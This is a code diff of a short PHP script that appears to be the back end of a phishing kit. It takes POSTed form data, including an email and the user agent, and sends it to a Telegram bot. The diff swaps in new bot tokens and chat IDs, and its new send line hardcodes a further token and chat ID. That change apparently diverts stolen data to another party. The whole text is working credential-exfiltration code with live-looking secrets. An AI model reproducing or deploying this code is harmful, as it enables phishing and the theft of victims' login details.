@@ -1,7 +1,7 @@
 <?php
 
-$botToken = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
-$chatId = "-4625923889";
+$botToken = "7888665977:AAH9WlEigUqHEWe6wb-AObVYaIm5fwVYCeQ";
+$chatId = "-1002333481899";
 
 
 $email = $_POST['email'];
@@ -45,7 +45,7 @@ $message .= "User Agent: $userAgent\n";
 $message .= "╰━─━≪ Info ❄️ ≫─━━╯";
 
 
-$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+$url = "https://api.telegram.org/bot7262494086:AAHb-NSvde1L9hn85wYput0paXLXdR1398Q/sendMessage?chat_id=-4698957739&parse_mode=Markdown&text=hello+world" . urlencode($message);
 file_get_contents($url);
 
 
